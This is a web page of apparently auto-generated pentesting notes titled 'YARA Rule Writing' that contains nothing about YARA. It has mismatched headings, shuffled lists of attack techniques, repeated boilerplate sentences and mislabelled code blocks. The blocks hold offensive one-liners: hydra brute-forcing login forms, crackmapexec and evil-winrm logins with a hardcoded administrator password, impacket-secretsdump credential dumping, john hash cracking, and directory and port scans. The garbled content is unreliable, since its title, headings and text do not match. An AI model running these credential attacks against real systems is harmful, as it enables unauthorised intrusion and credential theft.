---
TitleSEO: "YARA Rule Writing | ZureFX"
TitlePost: "YARA Rule Writing"
Author: "ZureFX"
Description: "Personal notes on YARA Rule Writing. Quick reference for pentesting and CTF challenges."
Keywords: "windows, lateral movement, dfir, cheatsheet, oscp, linux"
URL: "https://zurefx.github.io/notes/note-yara-rule-writing-690.html"
URL_IMAGES: ""
Date: "2025-05-01"
Tags: "Windows, Lateral Movement, DFIR, Cheatsheet, OSCP, Linux"
Section: "notes"
Lang: "en"
main_img: "note-yara-rule-writing-690"
Permalink: "/notes/note-yara-rule-writing-690.html"
BtnLabel: "Read Notes"
Pick: 0
---
## MongoDB

### SSTI

- `Unconstrained Delegation`
- `Command Injection`
- `Cron Job`
- `smbclient`
- `IDOR`
- `ffuf`

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.136.134 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.167.106 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## DNS

### enum4linux

- `Open Redirect`
- `feroxbuster`
- `Sudo Misconfiguration`
- `SeImpersonatePrivilege`

- `DLL Hijacking`
- `AlwaysInstallElevated`
- `Constrained Delegation`

> **Note:** Broken Access Control was identified as the primary attack vector in this scenario.

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

## burpsuite

### nmap

- `Silver Ticket`
- `Unquoted Service Path`
- `GPP Password`
- `rubeus`
- `sharphound`
- `Docker Escape`

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.61.66 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```python
crackmapexec smb 10.33.205.29 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.36.240/FUZZ
```

## Pass the Ticket

### SMB

```bash
evil-winrm -i 10.30.83.189 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.235.176 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.117.122.94 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p1521,8888,464 10.61.228.149 -oN scan.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.94.44 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Python

### NTLM Relay

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

```python
gobuster dir -u http://10.69.177.84/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.84.127.31 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.88.41.85 -u administrator -p 'P@ssw0rd!' --shares
```

## Nginx

### Django

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.55.188.161 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.25.77.173/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
gobuster dir -u http://10.89.52.185/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.92.65
```

```bash
nmap -sCV -p3268,8080,3306 10.34.121.100 -oN scan.txt
```
